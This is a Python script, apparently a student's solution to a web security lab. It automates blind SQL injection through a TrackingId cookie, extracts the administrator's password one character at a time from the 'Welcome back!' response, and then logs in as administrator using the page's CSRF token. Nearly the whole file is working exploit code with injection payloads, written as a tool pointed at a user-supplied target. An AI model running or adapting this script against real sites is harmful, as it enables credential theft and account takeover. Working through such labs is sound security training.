import requests
import string
import re

# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input
app_url = input("Enter the full target URL: ").strip()


# Create session
session = requests.Session()

response = session.get(app_url,proxies=proxies,verify=False)
cookies = session.cookies.get_dict()
# print(cookies)
# Convert the dictionary to a string (simulate a raw cookie string if needed)
cookie_str = str(cookies)

# Use regex to extract the TrackingId value
match = re.search(r"'TrackingId': '(.+?)'", cookie_str)
if match:
    tracking_id = match.group(1)
    print("TrackingId:", tracking_id)
else:
    print("TrackingId not found.")

    #Modify the TrackingId cookie, changing it to:

#TrackingId=xyz' AND '1'='1
#Verify that the Welcome back message appears in the response.

#Now change it to:

#TrackingId=xyz' AND '1'='2
#Verify that the Welcome back message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

#Now change it to:

#TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

print("[*] Determining password length...")
i = 1
while True:
    payload = f"{tracking_id}' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>{i})='administrator'--"
    cookies = {'TrackingId': payload}
    response = session.get(app_url, cookies=cookies, proxies=proxies, verify=False)

    if "Welcome back!" not in response.text:
        password_length = i
        print(f"[+] Password length determined: {password_length}")
        break
    else:
        print(f"[-] Password is longer than {i}")
        i += 1

# Step 2: Extract password
print("[*] Extracting password...")

extracted_password = ""

# You can adjust the range if needed (e.g., start=32 for space, end=127 for printable chars)
ascii_range = range(32, 127)  # Brute-force all printable ASCII characters

for position in range(1, password_length + 1):
    found = False
    for ascii_code in ascii_range:
        char = chr(ascii_code)
        payload = (
            f"{tracking_id}' AND (SELECT SUBSTRING(password,{position},1) "
            f"FROM users WHERE username='administrator')='{char}'--"
        )
        # SELECT * FROM sessions WHERE TrackingId = 'RSXAo7sk8HKAdPak' 
# ' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'a' --'
        # SUBSTRING(string, start_position, length)
        # SUBSTRING(password, 4, 1) returns the 4th character of the password as a single-character string

        cookies = {'TrackingId': payload}
        response = session.get(app_url, cookies=cookies, proxies=proxies, verify=False)

        if "Welcome back!" in response.text:
            extracted_password += char
           # x = 5
            #x += 3  # Same as x = x + 3
            #print(x)  # Output: 8
            #print(f"[+] Found character {position}: {char}")
            found = True
            break

    if not found:
        print(f"[-] Character not found at position {position}")
        extracted_password += "?"

print(f"\n[+] Extracted password: {extracted_password}")



print("Now lets login as admin, but firstly find csrf token")


res= session.get(app_url+"login",verify=False,proxies=proxies)
token_pattern = re.search(r'name="csrf" value="(.+?)"',res.text)  # way to find csrf token
ftoken = token_pattern.group(1)
print("CSRF token is", ftoken)


a_data = {'username':'administrator','password':extracted_password,'csrf':ftoken}
a_res = session.post(app_url+"/login",verify=False,proxies=proxies,data=a_data)
print("session for admin is", session.cookies.get_dict())